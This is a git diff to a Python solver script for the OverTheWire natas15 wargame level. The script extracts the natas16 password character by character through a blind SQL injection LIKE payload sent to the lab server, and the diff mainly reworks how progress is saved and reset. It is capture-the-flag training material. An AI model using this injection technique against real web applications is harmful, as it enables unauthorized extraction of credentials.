@@ -12,6 +12,12 @@ except:
     print('run source hackall.sh')
     exit(1)
 
+dict = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz '
+plTemplate = 'natas16" AND password LIKE "'
+
+passwd = ''
+bkp_path = 'natas16/.password'
+
 def mkReqWithPayload(pl):
     return rq.post(
         url = 'http://natas15.natas.labs.overthewire.org/',
@@ -24,15 +30,29 @@ def mkReqWithPayload(pl):
         }
     )
 
-dict = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz '
-plTemplate = 'natas16" AND password LIKE "'
+def reset():
+    global passwd
+    passwd = ''
+    f = open(bkp_path, 'wb')
+    f.write(passwd.encode('ascii'))
+    f.close()
+    bkp = open(bkp_path, 'wb')
+    print('\rnatas16 pass reset')
 
-passwd = ''
-bkp_path = 'natas16/.password'
+def exit_gracefully():
+    print('\033[?25h', end = '')
+    sys.exit(0)
+
+def sigint_handler(sig, frame):
+    print('\nSIGINT recieved')
+    exit_gracefully()
+
+signal.signal(signal.SIGINT, sigint_handler)
+
 if os.path.exists(bkp_path):
-    bkp = open(bkp_path, 'rb')
-    passwd = bkp.read().decode('utf-8')
-    bkp.close()
+    f = open(bkp_path, 'rb')
+    passwd = f.read().decode('utf-8')
+    f.close()
 
 if len(passwd) == 32:
     res = rq.get(
@@ -43,31 +63,15 @@ if len(passwd) == 32:
         print(passwd)
         exit(0)
     else:
-        print('natas16 auth failed')
-        passwd = ''
-        bkp = open(bkp_path, 'wb')
-        bkp.write(passwd.encode('ascii'))
-        bkp.close()
+        reset()
 
 print('\033[?25l', end = '')
 
-bkp = open(bkp_path, 'wb')
-
-def sigint_handler(sig, frame):
-    print('\nSIGINT recieved')
-    exit_gracefully()
-
-def exit_gracefully():
-    print('\033[?25h', end = '')
-    bkp.write(passwd.encode('ascii'))
-    bkp.close()
-    sys.exit(0)
-
-signal.signal(signal.SIGINT, sigint_handler)
-      
 while len(passwd) < 32:
     for i in dict:
-        if i == ' ': raise 'failed'
+        if i == ' ':
+            reset()
+            break
         pl = plTemplate + passwd + i + '%'
         r = mkReqWithPayload(pl)
         if r.ok: 
@@ -75,6 +79,9 @@ while len(passwd) < 32:
             if r.text.find('This user exists.') > -1:
                 passwd += i
                 print('\rhit:  ', passwd)
+                bkp = open(bkp_path, 'wb')
+                bkp.write(passwd.encode('ascii'))
+                bkp.close()
                 break
 
 print('password =', passwd)
